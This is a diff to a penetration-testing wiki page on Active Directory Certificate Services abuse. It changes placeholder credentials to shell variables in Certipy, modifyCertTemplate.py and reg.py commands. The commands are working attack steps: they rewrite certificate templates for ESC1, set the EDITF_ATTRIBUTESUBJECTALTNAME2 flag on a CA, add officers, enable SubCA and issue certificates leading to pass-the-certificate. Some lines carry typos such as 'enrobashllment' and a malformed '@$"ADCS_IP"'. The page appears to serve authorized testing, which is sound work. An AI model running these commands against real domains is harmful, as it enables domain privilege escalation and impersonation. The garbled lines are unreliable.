@@ -52,26 +52,26 @@ From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can 
 
 ```bash
 # 1. Overwrite the certificate template and save the old configuration
-certipy template -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -template templateName -save-old
+certipy template -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -template templateName -save-old
 
 # 2. After the ESC1 attack, restore the original configuration
-certipy template -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -template templateName -configuration 'templateName.json'
+certipy template -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -template templateName -configuration 'templateName.json'
 ```
 
 If a more precise template modification is needed, [modifyCertTemplate](https://github.com/fortalice/modifyCertTemplate) (Python) can be used to modify each attributes of the template.
 
 ```bash
 # 1. Disable Manager Approval Requirement
-modifyCertTemplate.py -template templateName -value 2 -property mspki-enrobashllment-flag domain.local/user:password
+modifyCertTemplate.py -template templateName -value 2 -property mspki-enrobashllment-flag "$DOMAIN/$USER:$PASSWORD"
 
 # 2. Disable Authorized Signature Requirement
-modifyCertTemplate.py -template templateName -value 0 -property mspki-ra-signature domain.local/user:password
+modifyCertTemplate.py -template templateName -value 0 -property mspki-ra-signature "$DOMAIN/$USER:$PASSWORD"
 
 # 3. Enable SAN Specification
-modifyCertTemplate.py -template templateName -add enrollee_supplies_subject -property msPKI-Certificate-Name-Flag domain.local/user:password
+modifyCertTemplate.py -template templateName -add enrollee_supplies_subject -property msPKI-Certificate-Name-Flag "$DOMAIN/$USER:$PASSWORD"
 
 # 4. Edit Certificate Application Policy Extension
-modifyCertTemplate.py -template templateName -value "'1.3.6.1.5.5.7.3.2', '1.3.6.1.5.2.3.4'" -property mspki-certificate-application-policy domain.local/user:password
+modifyCertTemplate.py -template templateName -value "'1.3.6.1.5.5.7.3.2', '1.3.6.1.5.2.3.4'" -property mspki-certificate-application-policy "$DOMAIN/$USER:$PASSWORD"
 ```
 
 {% hint style="info" %}
@@ -118,13 +118,13 @@ If sufficient rights are obtained over the Certificate Authority (Access Control
 ## Beware: change placeholder values CA-NAME, VALUE, NEW_VALUE
 
 # query flags
-reg.py 'DOMAIN'/'USER':'PASSWORD'@'CA_IP' query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA-NAME\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v editflags
+reg.py "$DOMAIN"/"$USER":"$PASSWORD"@$"ADCS_IP" query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA-NAME\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v editflags
 
 # bitwise OR to set the flag if not already (nothing changed if already set)
 python3 -c print("NEW_VALUE:", VALUE | 0x40000)
 
 # write flags
-reg.py 'DOMAIN'/'USER':'PASSWORD'@'CA_IP' add-keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA-NAME\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v editflags -vd NEW_VALUE
+reg.py "$DOMAIN"/"$USER":"$PASSWORD"@$"ADCS_IP" add-keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA-NAME\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v editflags -vd NEW_VALUE
 ```
 
 When it is not possible to restart the `CertSvc` service to enable the `EDITF_ATTRIBUTESUBJECTALTNAME2` attribute,the built-in template **SubCA** can be usefull.
@@ -141,13 +141,13 @@ From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can 
 
 ```bash
 # Add a new officier
-certipy ca -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -ca 'ca_name' -add-officier 'user'
+certipy ca -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' -add-officier 'user'
 
 # List all the templates
-certipy ca -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -ca 'ca_name' -list-templates
+certipy ca -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' -list-templates
 
 # Enable a certificate template
-certipy ca -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -ca 'ca_name' -enable-template 'SubCA'
+certipy ca -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' -enable-template 'SubCA'
 ```
 
 {% hint style="info" %}
@@ -196,10 +196,10 @@ From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can 
 
 ```bash
 # Issue a failed request (need ManageCA and ManageCertificates rights for a failed request)
-certipy ca -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -issue-request 100
+certipy ca -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -issue-request 100
 
 # Retrieve an issued certificate
-certipy req -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -retrieve 100
+certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -retrieve 100
 ```
 
 The certificate can then be used with [Pass-The-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
